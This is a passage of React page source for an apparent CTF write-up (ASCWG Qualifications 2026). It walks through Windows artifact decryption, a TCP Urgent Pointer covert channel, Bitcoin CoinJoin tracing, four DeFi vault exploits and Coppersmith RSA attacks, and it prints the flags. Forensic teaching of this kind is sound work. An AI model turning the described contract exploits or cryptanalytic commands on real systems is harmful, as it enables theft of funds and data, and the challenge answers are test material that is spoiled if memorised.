                      00000020   <span className="text-amber-300">... [48 Bytes High-Entropy Ciphertext] ...     </span>  <span className="text-zinc-500">................</span><br/>
                      <br/>
                      <span className="text-zinc-500"># Decryption using PCA AppHelp SolutionID (Key):</span><br/>
                      <span className="text-amber-400">&gt;</span> python decrypt_blob.py --key <span className="text-green-300">&quot;&#123;A92B31-...&#125;&quot;</span> --data payload.bin<br/>
                      <span className="text-zinc-300">SUCCESS: ASCWG&#123;c0mp4t_s0luti0n_h1d_th3_k3y_w1thin&#125;</span>
                    </code>
                  </pre>
                </div>
              </div>

              {/* Script */}
              <div id="search-script" className="scroll-mt-28 space-y-4 mb-8">
                <div className="flex justify-between items-center">
                  <span className="font-mono text-xs text-emerald-400 uppercase font-bold tracking-wider">
                    Automated Python Decryptor (`decrypt_blob.py`):
                  </span>
                  <CopyButton text={searchPythonScript} />
                </div>
                <div className="bg-[#050508] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-300 overflow-x-auto shadow-inner">
                  <pre><code>{searchPythonScript}</code></pre>
                </div>
                
                <div className="flex justify-between items-center pt-2">
                  <span className="font-mono text-xs text-amber-400 font-bold uppercase">Terminal One-Liner (PowerShell / Bash):</span>
                  <CopyButton text={searchOneliner} />
                </div>
                <div className="bg-black border border-zinc-800 rounded-xl p-3 font-mono text-xs text-zinc-300 overflow-x-auto">
                  <code>{searchOneliner}</code>
                </div>
              </div>

              {/* Methodology & Flag */}
              <div id="search-flag" className="scroll-mt-28 space-y-6">
                <details className="group bg-[#0a0a0a]/50 border border-zinc-800 rounded-xl overflow-hidden transition-all duration-300">
                  <summary className="p-4 cursor-pointer font-mono text-xs text-zinc-400 hover:text-white flex items-center justify-between list-none">
                    <span>[ SHOW METHODOLOGY: Windows.db &amp; PCA AppHelp Decryption ]</span>
                    <span className="transition group-open:rotate-180">▼</span>
                  </summary>
                  <div className="p-5 pt-0 border-t border-zinc-800/50 text-xs text-zinc-400 leading-relaxed bg-[#050505] font-mono">
                    <ol className="list-decimal pl-5 space-y-2 marker:text-amber-500">
                      <li>Navigated to <code>ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.db</code>.</li>
                      <li>Correlated execution of <code>OfficeUpdater.exe</code> with binary data in <code>System.Search.AutoSummary</code>.</li>
                      <li>Extracted 64-byte blob: 16 bytes metadata + 48 bytes high-entropy ciphertext.</li>
                      <li>Recovered PCA <code>AppHelp</code> metadata <code>SolutionID</code> GUID.</li>
                      <li>Derived key via UTF-16LE SHA-256 and decrypted ciphertext using AES-CBC.</li>
                    </ol>
                  </div>
                </details>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-5 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <div className="text-zinc-400 mb-1 font-bold text-xs uppercase tracking-wider">Decrypted Final Flag:</div>
                  <div className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm font-bold flex items-center justify-between gap-2">
                    <code>ASCWG&#123;c0mp4t_s0luti0n_h1d_th3_k3y_w1thin&#125;</code>
                    <CopyButton text="ASCWG{c0mp4t_s0luti0n_h1d_th3_k3y_w1thin}" />
                  </div>
                </div>
              </div>
            </article>

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 03: SENSOR CONFESSION                               */}
            {/* ------------------------------------------------------------- */}
            <article id="sensor-confession" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-rose-500/10 text-rose-400 border border-rose-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    PCAP // TCP URGENT
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    ICS TELEMETRY PROTOCOL SMUGGLING
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  Sensor Confession: ICS Telemetry Protocol Exfiltration
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Finding data hidden inside raw PCAP traffic. Inspecting unusual TCP packets, spotting data smuggled inside TCP Urgent Pointers, and reconstructing the full stream.
                </p>
              </div>

              {/* Prompt Box */}
              <div id="sensor-prompt" className="scroll-mt-28 bg-[#1c0e12]/90 border border-rose-500/30 rounded-2xl p-6 shadow-xl relative overflow-hidden mb-8 backdrop-blur-md">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="md:col-span-2 space-y-3">
                    <span className="bg-rose-500/20 text-rose-400 border border-rose-500/30 px-2.5 py-0.5 rounded text-xs font-mono font-bold uppercase tracking-wider inline-block">
                      Challenge Prompt
                    </span>
                    <p className="text-zinc-300 text-sm md:text-base leading-relaxed italic font-sans">
                      &ldquo;Our perimeter IDS flagged anomalous telemetry between industrial SCADA sensor controllers. Deep packet inspection indicates covert data exfiltration hiding inside legitimate TCP protocol header fields. Analyze the PCAP to reconstruct the leak.&rdquo;
                    </p>
                    <div className="flex flex-wrap gap-4 text-xs font-mono text-zinc-400 pt-2">
                      <span>● <strong>Category:</strong> Network Forensics / Covert Channels</span>
                      <span>● <strong>Platform:</strong> ASCWG Qualifications 2026</span>
                      <span>● <strong>Flag Format:</strong> <code>ASCWG&#123;...&#125;</code></span>
                    </div>
                  </div>
                  <div className="bg-[#0e0608] border border-rose-500/20 rounded-xl p-4 flex flex-col justify-between space-y-3">
                    <div>
                      <span className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest block mb-1">Provided Artifacts</span>
                      <div className="text-white font-mono text-sm font-bold flex items-center gap-2">
                        <span>sensor_dump.pcap</span>
                      </div>
                      <span className="text-[11px] font-mono text-zinc-400 block mt-1">Size: 94 MB • Packet Capture</span>
                      <span className="text-[11px] font-mono text-zinc-500 block">Protocol: TCP Urgent Pointer (URG)</span>
                    </div>
                    <div className="text-[10px] font-mono text-rose-400 bg-rose-500/10 px-2 py-1 rounded border border-rose-500/20 text-center truncate">
                      Analyzer: Wireshark / TShark / Scapy
                    </div>
                  </div>
                </div>
              </div>

              {/* Stage 1 */}
              <div id="sensor-stage-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-rose-400">Stage 1:</span> PCAP Triage &amp; Protocol Analysis
                </h3>

                <div className="bg-[#111111] border-l-4 border-rose-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-rose-400 font-bold mb-1 font-mono text-xs uppercase tracking-wider">Protocol Forensics: Covert Channel via TCP Urgent Pointer</h4>
                  <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                    Standard network traffic carries data inside the payload section. When packet payload is empty or filtered, covert channels can encode exfiltrated bytes into uninspected header fields. Here, the malware set the 16-bit TCP Urgent Pointer field on routine sensor heartbeat frames to transmit one ASCII byte per packet.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-rose-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> How was the flag exfiltrated from the sensor network?</p>
                  <p className="text-rose-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-rose-300">Data Exfiltration via TCP Urgent Pointer (URG) Covert Channel</code></p>
                </div>

                <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                  Using Wireshark and <code className="text-rose-400 bg-rose-400/10 px-1 rounded">tshark</code>, we filtered out normal handshakes and targeted non-zero urgent pointer fields from the sensor IP. The attacker abused the TCP Urgent Pointer field, usually unused in modern network traffic, to leak the flag byte-by-byte across consecutive packets.
                </p>
              </div>

              {/* Extraction */}
              <div id="sensor-extraction" className="scroll-mt-28 space-y-4 mb-8">
                <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-400 overflow-x-auto shadow-inner">
                  <div className="flex justify-between items-center mb-2 border-b border-zinc-800 pb-2">
                    <span className="text-zinc-500 font-bold">tshark_extraction.sh</span>
                    <CopyButton text={`tshark -r capture.pcap -Y "ip.src == 10.0.5.55 && tcp.urgent_pointer > 0" -T fields -e tcp.urgent_pointer`} />
                  </div>
                  <pre>
                    <code className="text-zinc-300">
                      <span className="text-rose-400">$</span> tshark -r capture.pcap -Y <span className="text-green-300">&quot;ip.src == 10.0.5.55 &amp;&amp; tcp.urgent_pointer &gt; 0&quot;</span> -T fields -e tcp.urgent_pointer | head -n 8<br/><br/>
                      <span className="text-zinc-500"># Output (Hexadecimal values of ASCII chars):</span><br/>
                      41 <span className="text-zinc-600 ml-4">// &apos;A&apos;</span><br/>
                      53 <span className="text-zinc-600 ml-4">// &apos;S&apos;</span><br/>
                      43 <span className="text-zinc-600 ml-4">// &apos;C&apos;</span><br/>
                      57 <span className="text-zinc-600 ml-4">// &apos;W&apos;</span><br/>
                      47 <span className="text-zinc-600 ml-4">// &apos;G&apos;</span><br/>
                      7b <span className="text-zinc-600 ml-4">// &apos;&#123;&apos;</span><br/>
                      74 <span className="text-zinc-600 ml-4">// &apos;t&apos;</span><br/>
                      33 <span className="text-zinc-600 ml-4">// &apos;3&apos;</span>
                    </code>
                  </pre>
                </div>
              </div>

              {/* Script */}
              <div id="sensor-script" className="scroll-mt-28 space-y-4 mb-8">
                <div className="flex justify-between items-center">
                  <span className="font-mono text-xs text-emerald-400 uppercase font-bold tracking-wider">
                    Automated Python Extractor (`extract_urg.py`):
                  </span>
                  <CopyButton text={sensorPythonScript} />
                </div>
                <div className="bg-[#050508] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-300 overflow-x-auto shadow-inner">
                  <pre><code>{sensorPythonScript}</code></pre>
                </div>
                
                <div className="flex justify-between items-center pt-2">
                  <span className="font-mono text-xs text-rose-400 font-bold uppercase">Terminal One-Liner (PowerShell / Bash):</span>
                  <CopyButton text={sensorOneliner} />
                </div>
                <div className="bg-black border border-zinc-800 rounded-xl p-3 font-mono text-xs text-zinc-300 overflow-x-auto">
                  <code>{sensorOneliner}</code>
                </div>
              </div>

              {/* Flag */}
              <div id="sensor-flag" className="scroll-mt-28 space-y-6">
                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-5 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <div className="text-zinc-400 mb-1 font-bold text-xs uppercase tracking-wider">Final Submitted Flag:</div>
                  <div className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm font-bold flex items-center justify-between gap-2">
                    <code>ASCWG&#123;t3l3m3try_s3ns0r_d4t4_l34k_v14_tcp&#125;</code>
                    <CopyButton text="ASCWG{t3l3m3try_s3ns0r_d4t4_l34k_v14_tcp}" />
                  </div>
                </div>
              </div>
            </article>

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 04: NIGHTSHADE VENDOR                               */}
            {/* ------------------------------------------------------------- */}
            <article id="nightshade-vendor" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-purple-500/10 text-purple-400 border border-purple-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    BITCOIN // COINJOIN MIXER
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    DARK WEB INTELLIGENCE
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  NightShade Vendor: CoinJoin Mixer De-Anonymization
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Tracking illicit Bitcoin transactions through a Wasabi CoinJoin mixer. Using the TRACE-7 Peel-Chain method and multi-input clustering to unmask the real destination.
                </p>
              </div>

              {/* Prompt Box */}
              <div id="nightshade-prompt" className="scroll-mt-28 bg-[#140e1c]/90 border border-purple-500/30 rounded-2xl p-6 shadow-xl relative overflow-hidden mb-8 backdrop-blur-md">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="md:col-span-2 space-y-3">
                    <span className="bg-purple-500/20 text-purple-400 border border-purple-500/30 px-2.5 py-0.5 rounded text-xs font-mono font-bold uppercase tracking-wider inline-block">
                      Challenge Prompt
                    </span>
                    <p className="text-zinc-300 text-sm md:text-base leading-relaxed italic font-sans">
                      &ldquo;An illicit dark web vendor operating under the moniker &apos;NightShade&apos; conducted multi-stage Bitcoin laundering via Wasabi/Samourai CoinJoin mixing pools. Deconstruct the peel-chains and multi-input clustering to trace the illicit funds.&rdquo;
                    </p>
                    <div className="flex flex-wrap gap-4 text-xs font-mono text-zinc-400 pt-2">
                      <span>● <strong>Category:</strong> Blockchain OSINT / Dark Web Intelligence</span>
                      <span>● <strong>Platform:</strong> ASCWG Qualifications 2026</span>
                      <span>● <strong>Flag Format:</strong> <code>ASCWG&#123;...&#125;</code></span>
                    </div>
                  </div>
                  <div className="bg-[#0a0710] border border-purple-500/20 rounded-xl p-4 flex flex-col justify-between space-y-3">
                    <div>
                      <span className="text-[11px] font-mono text-zinc-500 uppercase tracking-widest block mb-1">Provided Artifacts</span>
                      <div className="text-white font-mono text-sm font-bold flex items-center gap-2">
                        <span>vendor_intel.json</span>
                      </div>
                      <span className="text-[11px] font-mono text-zinc-400 block mt-1">Export: Blockchain Ledger CSV</span>
                      <span className="text-[11px] font-mono text-zinc-500 block">Ledger: Bitcoin UTXO Model</span>
                    </div>
                    <div className="text-[10px] font-mono text-purple-400 bg-purple-500/10 px-2 py-1 rounded border border-purple-500/20 text-center truncate">
                      Methodology: TRACE-7 Protocol
                    </div>
                  </div>
                </div>
              </div>

              {/* Stage 1-2 */}
              <div id="nightshade-stage-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-purple-400">Stage 1 &amp; 2:</span> The Peel-Chain Walk
                </h3>

                <div className="bg-[#100d1a] border-l-4 border-purple-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-purple-400 font-bold mb-1 font-mono text-xs uppercase tracking-wider">Blockchain Forensics: Peel Chain Mechanics</h4>
                  <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                    A peel chain is a laundering pattern where an address with a large balance repeatedly sends small fractions to payment or cash-out endpoints while forwarding the majority of funds to a fresh change address. In UTXO graph analysis, isolating the largest output value at each transaction hop allows us to track the principal fund stream across multiple hops.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> How do we separate the &ldquo;peel&rdquo; from the &ldquo;pot&rdquo;?</p>
                  <p className="text-green-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-green-300">Always follow the output with the greatest integer satoshi value.</code></p>
                </div>
              </div>

              {/* Script */}
              <div id="nightshade-script" className="scroll-mt-28 space-y-4 mb-8">
                <div className="flex justify-between items-center">
                  <span className="font-mono text-xs text-emerald-400 uppercase font-bold tracking-wider">
                    Automated TRACE-7 Walker (`trace7_walker.py`):
                  </span>
                  <CopyButton text={nightshadePythonScript} />
                </div>
                <div className="bg-[#050508] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-300 overflow-x-auto shadow-inner">
                  <pre><code>{nightshadePythonScript}</code></pre>
                </div>
                
                <div className="flex justify-between items-center pt-2">
                  <span className="font-mono text-xs text-purple-400 font-bold uppercase">Terminal One-Liner (PowerShell / Bash):</span>
                  <CopyButton text={nightshadeOneliner} />
                </div>
                <div className="bg-black border border-zinc-800 rounded-xl p-3 font-mono text-xs text-zinc-300 overflow-x-auto">
                  <code>{nightshadeOneliner}</code>
                </div>
              </div>

              {/* Stage 3 */}
              <div id="nightshade-stage-3" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-purple-400">Stage 3:</span> CoinJoin De-Anonymization &amp; Multi-Input Clustering
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs uppercase tracking-wider">COINJOIN MECHANICS &amp; ANONYMITY SET</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    CoinJoin combines multiple transactions into a single batch where multiple participants provide inputs and receive equal-denomination outputs, obscuring individual input-to-output links. However, if a user later spends multiple equal-denomination outputs together in a single downstream transaction, common-input ownership heuristics de-anonymize the user by linking those distinct outputs back to the same entity.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-red-500"></div>
                  <p className="text-zinc-400 mb-1 font-bold">The Fatal Operational Security Flaw</p>
                  <p className="text-zinc-300 text-xs">
                    The NightShade vendor subsequently spent multiple identical outputs from the CoinJoin within a single consolidation transaction, collapsing their own anonymity set via multi-input clustering.
                  </p>
                </div>
              </div>

              {/* Flag */}
              <div id="nightshade-flag" className="scroll-mt-28 space-y-6">
                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-5 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <div className="text-zinc-400 mb-2">Token Concatenation: <code className="text-purple-300">T1 + T2 + T3 + T4 + T5 + T6</code></div>
                  <div className="text-zinc-400 mb-3">Hash Algorithm: <code className="text-purple-300">SHA-256 (First 32 hex chars)</code></div>
                  <div className="text-zinc-400 mb-1 font-bold text-xs uppercase tracking-wider">Final Submitted Flag:</div>
                  <div className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm font-bold flex items-center justify-between gap-2">
                    <code>ASCWG&#123;eed6ca7d462ef13d0f2ed13b1f7510fd&#125;</code>
                    <CopyButton text="ASCWG{eed6ca7d462ef13d0f2ed13b1f7510fd}" />
                  </div>
                </div>
              </div>
            </article>

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 05: CASCADED FALLACY                                */}
            {/* ------------------------------------------------------------- */}
            <article id="cascaded-fallacy" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    EVM // DEFI EXPLOIT
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    SMART CONTRACT FORENSICS
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  Cascaded Fallacy: Sepolia DeFi Reentrancy &amp; EVM Trace Carving
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Investigating a multi-stage decentralized finance exploit on the Ethereum Sepolia testnet. Analyzing internal opcode traces on Blockscout to spot reentrancy and broken access control.
                </p>
              </div>

              {/* Stage 1 */}
              <div id="cascaded-stage-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">Stage 1:</span> GenesisVault &amp; Reentrancy
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Vulnerability: Checks-Effects-Interactions Violation</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    GenesisVault executed an external ETH transfer before decrementing the user&apos;s internal ledger balance. A malicious fallback function can repeatedly call into the withdrawal function during the execution frame before the state update occurs, draining the vault liquidity.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> How was the GenesisVault initially drained?</p>
                  <p className="text-green-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-green-300">Reentrancy Attack (Checks-Effects-Interactions Violation)</code></p>
                </div>
              </div>

              {/* Stage 2 */}
              <div id="cascaded-stage-2" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">Stage 2:</span> PatchedVault &amp; Broken Access Control
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Vulnerability: Missing Caller Ownership Validation</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    PatchedVault checked whether the provided GhostShare NFT token ID possessed liquidation rights, but failed to verify whether <code>msg.sender</code> actually owned or had approval for that specific token ID. Any caller could supply a valid token ID held by an external user and trigger unauthorized liquidations.
                  </p>
                </div>

                <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                  The <code className="text-pink-400 bg-pink-400/10 px-1 rounded">liquidate()</code> function was protected by an Access Control mechanism that required a specific GhostShare NFT. However, the contract failed to properly verify if the person calling the function (<code className="text-pink-400 bg-pink-400/10 px-1 rounded">msg.sender</code>) actually owned the NFT token ID passed in the parameters.
                </p>
              </div>

              {/* Stage 3 */}
              <div id="cascaded-stage-3" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">Stage 3:</span> SignedVault &amp; Signature Replay
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Vulnerability: EIP-712 Signature Replay (Missing Nonce)</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    SignedVault verified off-chain admin signatures using EIP-712 typed structured data. Because the hash schema lacked a per-user nonce or deadline timestamp, an intercepted signature remained valid indefinitely and was replayed to drain additional funds.
                  </p>
                </div>

                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-4 font-mono text-sm relative overflow-hidden">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <p className="text-zinc-400 mb-1"><span className="text-zinc-600">Q:</span> Why was the attacker able to reuse the admin&apos;s withdrawal signature?</p>
                  <p className="text-green-400"><span className="text-zinc-600">A:</span> <code className="bg-black/50 px-2 py-0.5 rounded text-green-300">Missing Nonce in EIP-712</code></p>
                </div>
              </div>

              {/* Stage 4 */}
              <div id="cascaded-stage-4" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">Stage 4:</span> OracleVault &amp; Price Manipulation
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Vulnerability: Spot AMM Price Oracle Manipulation</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    OracleVault queried instantaneous token reserves from a low-liquidity AMM pool rather than a Time-Weighted Average Price (TWAP) or decentralized oracle feed. By leveraging a flash loan to swap against the pool, the attacker manipulated the spot price within a single transaction block to force bad-debt liquidations.
                  </p>
                </div>

                <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                  The final vault relied on a shallow <code className="text-pink-400 bg-pink-400/10 px-1 rounded">SpotPool</code> AMM as a price oracle. The attacker used a massive Flash Loan to temporarily dump tokens into the AMM, drastically crashing the spot price inside a single transaction block without TWAP protection.
                </p>
              </div>

              {/* Flag */}
              <div id="cascaded-flag" className="scroll-mt-28 space-y-6">
                <div className="bg-[#0a0a0a] border border-zinc-800 rounded-xl p-5 font-mono text-sm relative overflow-hidden break-all shadow-lg shadow-green-500/10">
                  <div className="absolute top-0 left-0 w-1 h-full bg-green-500"></div>
                  <div className="text-zinc-400 mb-1">Stage 1-4 Chain: <code className="text-green-300">reentrancy_accesscontrol_signaturereplay_oraclemanipulation</code></div>
                  <div className="text-zinc-400 mb-3">Launder Wallet: <code className="text-pink-300">0x071a8E8c5c0484B7A2fFA06530518DC9209e627f</code></div>
                  <div className="text-zinc-400 mb-1 font-bold text-xs uppercase tracking-wider">Final Submitted Flag:</div>
                  <div className="text-white bg-green-900/40 border border-green-500/30 p-3 rounded-lg text-sm font-bold flex items-center justify-between gap-2">
                    <code>ASCWG&#123;reentrancy_accesscontrol_signaturereplay_oraclemanipulation_0x071a8E8c5c0484B7A2fFA06530518DC9209e627f&#125;</code>
                    <CopyButton text="ASCWG{reentrancy_accesscontrol_signaturereplay_oraclemanipulation_0x071a8E8c5c0484B7A2fFA06530518DC9209e627f}" />
                  </div>
                </div>
              </div>
            </article>

            {/* ------------------------------------------------------------- */}
            {/* CHALLENGE 06: CRYPTO SUITE                                    */}
            {/* ------------------------------------------------------------- */}
            <article id="crypto-suite" className="scroll-mt-24 bg-[#0a0a0f]/90 border border-zinc-800 rounded-3xl p-6 sm:p-8 backdrop-blur-xl relative overflow-hidden shadow-2xl">

              <div className="mt-6 border-b border-zinc-800/80 pb-6 mb-6">
                <div className="flex flex-wrap items-center gap-2 mb-3">
                  <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                    SVP // LATTICE REDUCTION
                  </span>
                  <span className="bg-zinc-900 text-zinc-400 border border-zinc-800 font-mono text-xs px-2.5 py-0.5 rounded">
                    ADVANCED MATH ATTACKS
                  </span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-extrabold text-white font-[family-name:var(--font-share-tech)] mb-2">
                  Cryptography CTF Suite: Advanced Math Attacks
                </h2>
                <p className="text-zinc-400 text-sm font-sans">
                  Solving advanced math CTF challenges using SageMath. Applying Coppersmith&apos;s small roots algorithm and solving Shortest Vector Problems (SVP) via LLL lattice reduction.
                </p>
              </div>

              {/* Part 1 */}
              <div id="crypto-part-1" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">1.</span> Complex Polynomial Root Recovery (Crypto 1)
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Cryptanalysis: Coppersmith&apos;s Small Roots via LLL</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
                    When RSA plaintext is partially known or stereotypic, the unknown portion can be expressed as a root of a monic polynomial modulo N. If the root size is bounded (here x &lt; 2^256), Coppersmith&apos;s theorem maps the problem to finding a short vector in a polynomial lattice using LLL, solving for the secret root in polynomial time.
                  </p>
                </div>

                <div className="bg-[#050505] border border-zinc-800 rounded-xl p-4 font-mono text-xs text-zinc-400 overflow-x-auto shadow-inner">
                  <span className="text-zinc-500 block mb-2 font-bold">SageMath Console</span>
                  <pre>
                    <code className="text-zinc-300">
                      <span className="text-pink-400">sage:</span> N = 1007845705359... <span className="text-zinc-500"># (RSA Modulus)</span><br/>
                      <span className="text-pink-400">sage:</span> P.&lt;x&gt; = PolynomialRing(Zmod(N))<br/>
                      <span className="text-pink-400">sage:</span> f = (padded_prefix * 2^256 + x)^3 - c<br/>
                      <br/>
                      <span className="text-zinc-500"># Coppersmith's Method for Small Roots</span><br/>
                      <span className="text-pink-400">sage:</span> roots = f.small_roots(X=2^256, beta=1, epsilon=0.03)<br/>
                      <span className="text-pink-400">sage:</span> <span className="text-blue-300">print</span>(roots[0])<br/>
                      <br/>
                      <span className="text-green-300">14705318086055172266874834220021644781404179346</span><br/>
                      <span className="text-zinc-500"># Hex Conversion -&gt; b&apos;ASCWG&#123;sm4ll_r00ts_h4ck&#125;&apos;</span>
                    </code>
                  </pre>
                </div>
              </div>

              {/* Part 2 */}
              <div id="crypto-part-2" className="scroll-mt-28 space-y-4 mb-8">
                <h3 className="text-xl font-bold text-white font-[family-name:var(--font-share-tech)] flex items-center gap-2">
                  <span className="text-emerald-400">2.</span> Flawed ZKP Identification Protocol (Crypto 2)
                </h3>

                <div className="bg-[#111111] border-l-4 border-blue-500 p-5 rounded-r-xl shadow-lg">
                  <h4 className="text-blue-400 font-bold mb-1 font-mono text-xs">Protocol Analysis: Honest-Verifier ZKP Flaw</h4>
                  <p className="text-sm text-zinc-400 leading-relaxed font-sans">
